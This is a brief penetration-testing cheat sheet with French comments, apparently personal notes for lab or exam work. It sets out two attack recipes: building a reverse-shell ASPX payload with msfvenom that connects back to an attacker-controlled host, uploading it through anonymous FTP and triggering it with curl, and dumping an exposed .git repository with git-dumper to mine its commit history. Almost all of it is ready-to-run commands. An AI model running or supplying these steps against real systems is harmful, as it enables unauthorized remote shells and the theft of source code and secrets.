# FTP upload

```shell
# 1. Créer le shell
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=443 -f asp > shell.aspx

# 2. Listener
nc -lvnp 443

# 3. Upload via FTP
ftp $target
# anonymous / anonymous
put shell.aspx
ls   # vérifier

# 4. Déclencher
curl http://$target/shell.aspx
```
# .git exposed
```bash
pipx install git-dumper
git-dumper http://192.168.191.144/.git/ ./output
cd output
git log --all
git show <commit_hash>
git diff HEAD~1
```
